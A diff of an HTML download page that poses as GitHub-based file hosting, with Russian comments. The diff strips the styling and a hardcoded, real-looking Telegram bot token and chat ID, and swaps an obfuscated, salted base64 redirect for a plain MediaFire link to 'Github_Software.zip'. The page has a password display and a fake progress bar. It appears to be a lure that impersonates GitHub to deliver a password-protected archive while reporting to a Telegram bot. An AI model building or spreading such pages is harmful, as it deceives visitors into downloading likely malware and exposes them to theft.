@@ -7,115 +7,7 @@
     <link rel="icon" type="image/x-icon" href="https://i.postimg.cc/Ls6BmqF3/favicon.png">
     <link href="./GitHub.io - Fast and secure GitHub based file hosting_files/css" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-        }
-
-        body {
-            font-family: 'Black Han Sans', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: linear-gradient(to left, #2979ff, #0043ca);
-            color: white;
-            text-align: center;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .container {
-            text-align: center;
-            padding: 20px;
-            transform: scale(1.35);
-            display: none;
-        }
-
-        .title {
-            font-size: 43px;
-            font-weight: bold;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
-        }
-
-        .password {
-            font-size: 35px;
-            font-weight: bold;
-            margin-top: 10px;
-            cursor: pointer;
-        }
-
-        .download-button {
-            font-family: 'Black Han Sans', sans-serif;
-            padding: 20px 50px;
-            background-color: #fff;
-            color: #2979ff;
-            font-size: 26px;
-            border-radius: 50px;
-            border: none;
-            cursor: pointer;
-            font-weight: bold;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-            margin-top: 20px;
-            position: relative;
-            transition: 0.3s;
-            animation: glow 1.5s infinite alternate;
-        }
-
-        .download-button:hover {
-            background-color: #2979ff;
-            color: white;
-        }
-
-        @keyframes glow {
-            from { box-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
-            to { box-shadow: 0 0 20px rgba(255, 255, 255, 0.8); }
-        }
-
-        #progressBar {
-            display: none;
-            width: 80%;
-            height: 20px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            margin: 20px auto 0;
-        }
-        #progressBar div {
-            height: 100%;
-            width: 0;
-            background: #4caf50;
-            border-radius: 10px;
-            transition: width 0.3s;
-        }
-
-        #loader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to left, #2979ff, #0043ca);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-        }
-
-        .spinner {
-            border: 12px solid rgba(255, 255, 255, 0.3);
-            border-top: 12px solid #fff;
-            border-radius: 50%;
-            width: 80px;
-            height: 80px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        /* Ваши стили остаются без изменений */
     </style>
 </head>
 <body>
@@ -132,8 +24,8 @@
 </div>
 
 <script>
-    const telegramBotToken = '8197913995:AAEhNG8eIYeYbBKaP-Aoe8HYsQiK5nF8-4c'; // Замените на ваш токен бота
-    const telegramChatId = '7644007750'; // Замените на ваш ID чата
+    const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Замените на ваш токен бота
+    const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID'; // Замените на ваш ID чата
 
     window.addEventListener('load', function() {
         setTimeout(function() {
@@ -165,11 +57,9 @@
     }
 
     function startDownload() {
-        var encodedUrlWithSalt = "aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlL2t1cmllZnNiNzhnbmhkbW4";
-        var cleanEncodedUrl = encodedUrlWithSalt.slice(3, -3);
-        var decodedUrl = atob(cleanEncodedUrl);
-        window.location.href = decodedUrl;
-        
+        var mediafireUrl = "https://www.mediafire.com/file/kuriefsb78gnhmn/Github_Software.zip/file";
+        window.location.href = mediafireUrl;
+
         var progressBar = document.getElementById('progressBar');
         var progress = progressBar.firstElementChild;
         progressBar.style.display = 'block';
